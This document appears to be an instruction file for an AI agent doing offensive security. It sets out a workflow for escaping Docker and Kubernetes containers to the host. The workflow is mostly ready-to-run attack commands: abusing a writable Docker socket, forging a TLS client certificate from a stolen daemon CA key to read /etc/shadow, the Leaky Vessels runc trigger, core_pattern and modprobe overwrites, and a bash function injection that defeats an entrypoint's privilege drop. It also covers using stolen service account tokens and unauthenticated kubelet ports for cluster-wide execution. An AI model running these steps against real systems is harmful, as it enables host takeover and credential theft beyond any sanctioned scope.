---
name: container-technique
description: "Container methodology: Identifying containerization limits, Docker/K8s misconfigurations, and executing escapes to the host node."
---

# container-technique

**Goal**: Exploit container environments (Docker, Kubernetes, LXC) to achieve host-level code execution, horizontal pod movement, or cluster takeover.

## When this technique applies
- You have gained a shell via Web RCE or SSH and notice `.dockerenv`, `kubepods` in cgroups, or specific mount patterns.
- You have acquired compromised Kubeconfigs or Service Account tokens.

## The Escape Workflow

### 1. Internal Reconnaissance
Determine the isolation boundaries.
- **Am I in a container?**: `ls -la /.dockerenv ; cat /proc/1/cgroup`
- **What privileges do I have?**: `capsh --print` (look for `CAP_SYS_ADMIN`, `CAP_SYS_MODULE`, `CAP_SYS_PTRACE`).
- **Network mapping**: Look for `kube-dns` or metadata endpoints (e.g. `169.254.169.254` or GCP/Azure equivalents).

### 2. Hunting for Escape Vectors

- **Exposed Docker Socket**: `ls -la /var/run/docker.sock`. If writable (or you are in the `docker` group), attach the host root filesystem to a new container — with the CLI *or* the REST API via `curl --unix-socket` when no docker binary is present. Full flows + host bind-mount abuse: `references/socket-and-mounts.md`.
- **Excessive capability (not full `--privileged`)**: `capsh --print` shows a single dangerous cap (`CAP_SYS_MODULE`, `CAP_DAC_READ_SEARCH`, `CAP_SYS_PTRACE`, `CAP_MKNOD`…). Each has its own escape — see `references/capability-escapes.md`.
- **Docker daemon over TCP (2375 plain / 2376 TLS)**: `ss -tlnp | grep -E '2375|2376'` or read `dockerd -H` args in `ps`. Plain 2375 = instant `docker -H tcp://host:2375 run -v /:/mnt ...`. TLS 2376 needs a client cert signed by the daemon CA — hunt the CA key (`ca.pem`+`ca-key.pem`, often in `/etc/docker/certs`, an NFS/world-readable share, or a config repo) and forge one:
  ```bash
  openssl genrsa -out c-key.pem 4096; openssl req -new -key c-key.pem -subj /CN=root -out c.csr
  printf 'extendedKeyUsage=clientAuth\n' > e.cnf
  openssl x509 -req -in c.csr -CA ca.pem -CAkey ca-key.pem -out c.pem -days 365 -extfile e.cnf
  docker --tlsverify --tlscacert=ca.pem --tlscert=c.pem --tlskey=c-key.pem -H host:2376 run --rm -v /:/mnt <img> cat /mnt/etc/shadow
  ```
  If an **authorization plugin** (`--authorization-plugin=authz-broker`) denies actions, it keys policy on the client-cert **CN** — read the policy (`/var/lib/authz-broker/policy.json`) and set `-subj /CN=<allowed-user>` (a `{"users":["root"],"actions":[""]}` entry = full access). Then `run -v /:/mnt` to read host secrets / a machine keytab / drop an authorized_key.
- **Leaky Vessels (CVE-2024-21626)**: runc <=1.1.11 / Docker <25.0.2 / containerd <1.6.28 / <1.7.13. If you can spawn a container (docker socket, k8s exec, buildx), the trigger is `docker run -w /proc/self/fd/8 <img>` — the working directory is set before namespace unshare, giving host FS access. Confirm host runc version via `strings $(command -v runc) | grep -m1 'runc version'` if reachable, otherwise attempt directly.
- **Privileged Container**: If `fdisk -l` lists host drives or `capsh` shows `CAP_SYS_ADMIN`, mount the host filesystem (e.g., `mount /dev/sda1 /mnt`) or load a malicious kernel module.
- **Cgroups Release Agent**: If `CAP_SYS_ADMIN` is present on cgroups v1, leverage the `release_agent` feature to spawn host processes.
- **core_pattern / modprobe_path**: Overwrite `/proc/sys/kernel/core_pattern` (pipe format) or `/proc/sys/kernel/modprobe` to make the kernel run an attacker script as root on the host. Works on cgroups v1 and v2. Trigger via SIGSEGV crash or unknown-magic binary execution. Use overlay `upperdir` from `/proc/self/mountinfo` for host-accessible read/write path.
- **Entrypoint UID-drop bypass**: If the image entrypoint checks `$(id -u)` to decide whether to drop privileges via `gosu`/`su-exec`, and `/bin/sh` is bash, inject `BASH_FUNC_id%%=() { echo uid=1000; }` as an environment variable. Bash imports it as a function overriding `/usr/bin/id`, so the check sees non-root and skips the privilege drop. Container stays as real uid 0.

### 3. Kubernetes Specifics
- **Service Account Tokens**: Located at `/var/run/secrets/kubernetes.io/serviceaccount/`.
- **API Server Recon**: Use `curl -skH "Authorization: Bearer $TOKEN" https://$KUBERNETES_SERVICE_HOST/api/v1/namespaces/default/pods/`
- **Kubelet / ETCD Unauthenticated Ports**: Check if ports `10250` (kubelet), `10255` (kubelet readonly, disabled by default since 1.21 but still common on legacy/GKE), or `2379` (etcd) are exposed internally without authentication. On `10250` the endpoint `POST /run/<ns>/<pod>/<container>` yields RCE inside any pod.
- **RBAC nodes/proxy GET → RCE**: A service account with `nodes/proxy` GET (frequently granted to monitoring/observability tooling) can proxy the kubelet API and exec into arbitrary pods cluster-wide, including control-plane. Test with `kubectl auth can-i get nodes/proxy` before deeper enum.

## Quality Gates
- **Do not break the pod**: Kernel module injection and heavy cgroup manipulation can crash the container host. Perform checks first.
- **Proof of Action**: Once you escape, immediately collect evidence of reaching the underlying host (e.g., `cat /etc/shadow` from the host mount) rather than deploying destructive backdoors.

## References
- [references/privileged-escapes.md](references/privileged-escapes.md) — Load when dealing with a container running with `--privileged` or `CAP_SYS_ADMIN` (mount host disk, cgroups `release_agent`, `core_pattern`/`modprobe_path`).
- [references/capability-escapes.md](references/capability-escapes.md) — Load for a single excessive capability without full privileged: capability→vector triage table, `CAP_SYS_MODULE`, `CAP_DAC_READ_SEARCH`/`CAP_DAC_OVERRIDE` (shocker), `CAP_SYS_PTRACE` (+`--pid=host`), `CAP_MKNOD`.
- [references/socket-and-mounts.md](references/socket-and-mounts.md) — Load when the Docker socket is reachable (CLI or `curl` REST API), the user is in the `docker` group, or sensitive host paths are bind-mounted (`-v /:/host`, `/etc`, `/root`).
